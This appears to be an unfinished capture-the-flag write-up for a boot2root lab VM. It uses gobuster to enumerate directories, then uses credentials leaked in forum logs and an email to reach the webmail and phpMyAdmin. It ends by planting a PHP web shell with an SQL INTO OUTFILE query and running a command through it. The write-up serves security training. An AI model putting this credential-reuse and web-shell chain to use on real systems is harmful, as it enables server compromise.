### Fill this later

With `gobuster` we can try to find directories and files on the server.

```
nlederge@k0r3p13:~/my_bins $ gobuster dir -u 10.11.250.230 -w ~/SecLists/Discovery/Web-Content/common.txt                    
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.250.230
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/nlederge/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 290]
.hta                 (Status: 403) [Size: 285]
.htpasswd            (Status: 403) [Size: 290]
cgi-bin/             (Status: 403) [Size: 289]
fonts                (Status: 301) [Size: 314] [--> http://10.11.250.230/fonts/]
forum                (Status: 403) [Size: 286]
index.html           (Status: 200) [Size: 1025]
server-status        (Status: 403) [Size: 294]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

The route `forum` is interesting but we get a forbidden access. By using our browser and ignoring the expired TLS certificate, we can access it `https://10.11.250.230/forum`.
We can try again with gobuster but now by ignoring the invalid certificates.

```
nlederge@k0r3p13:~/my_bins $ gobuster dir -u https://10.11.250.230 -k -w ~/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.11.250.230
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/nlederge/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
cgi-bin/             (Status: 403) [Size: 290]
forum                (Status: 301) [Size: 316] [--> https://10.11.250.230/forum/]
phpmyadmin           (Status: 301) [Size: 321] [--> https://10.11.250.230/phpmyadmin/]
server-status        (Status: 403) [Size: 295]
webmail              (Status: 301) [Size: 318] [--> https://10.11.250.230/webmail/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

It gives us a few interesting directories : `forum`, `phpmyadmin`, `webmail`. `phpmyadmin` and `webmail` ask for credentials, `forum` doesn't.

By browsing the `forum`, we can see that there are multiple posts and specifically one about `Probleme login ?` posted by `lmezard` posting a lot of logs.
There a useful information in the logs :
- The server hostname `BornToSecHackMe` is revealed.
- `lmezard` is a valid user account and scheduled cron jobs.
- `admin` is also a valid account and has sudo access.
- The string `!q\]Ej?*5K5cy*AJ` is entered in the login field, probably an accidental pasted string.

We can login to the forum with the credentials `lmezard` : `!q\]Ej?*5K5cy*AJ`. When trying to send an email to the admin account, our mail appears as the sender email `laurie@borntosec.net`. We can login to the webmail with the credentials `lmezard` : `!q\]Ej?*5K5cy*AJ`.

An email sent by `qudevide` to `lmezard` says :

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

With these credentials `root` : `Fg-'kKXBj87E:aJ$`, we can login to the phpmyadmin database and see the databases.
We can execute SQL queries to create files on the server, let's try to create a shell.php file in the forum directory to try to create a reverse shell. The issue is that we can't write directly in the '/var/www/forum' directory, we need to find another directory to write the file.

Let's enumerate the subdirectories with `gobuster`.
```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ gobuster dir -u https://10.11.250.230/forum/ -k -w ~/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.11.250.230/forum/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/nlederge/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 297]
.htaccess            (Status: 403) [Size: 297]
.hta                 (Status: 403) [Size: 292]
backup               (Status: 403) [Size: 294]
config               (Status: 403) [Size: 294]
images               (Status: 301) [Size: 323] [--> https://10.11.250.230/forum/images/]
includes             (Status: 301) [Size: 325] [--> https://10.11.250.230/forum/includes/]
js                   (Status: 301) [Size: 319] [--> https://10.11.250.230/forum/js/]
lang                 (Status: 301) [Size: 321] [--> https://10.11.250.230/forum/lang/]
modules              (Status: 301) [Size: 324] [--> https://10.11.250.230/forum/modules/]
index.php            (Status: 200) [Size: 4935]
index                (Status: 200) [Size: 4935]
templates_c          (Status: 301) [Size: 328] [--> https://10.11.250.230/forum/templates_c/]
themes               (Status: 301) [Size: 323] [--> https://10.11.250.230/forum/themes/]
update               (Status: 301) [Size: 323] [--> https://10.11.250.230/forum/update/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

After trying all the possible directories, we can write the shell.php file in the `templates_c` directory, phpmyadmin gives us a successful response.
```
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php';
```

We can now access the shell.php file with the following URL : `https://10.11.250.230/forum/templates_c/shell.php?c=id`.

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
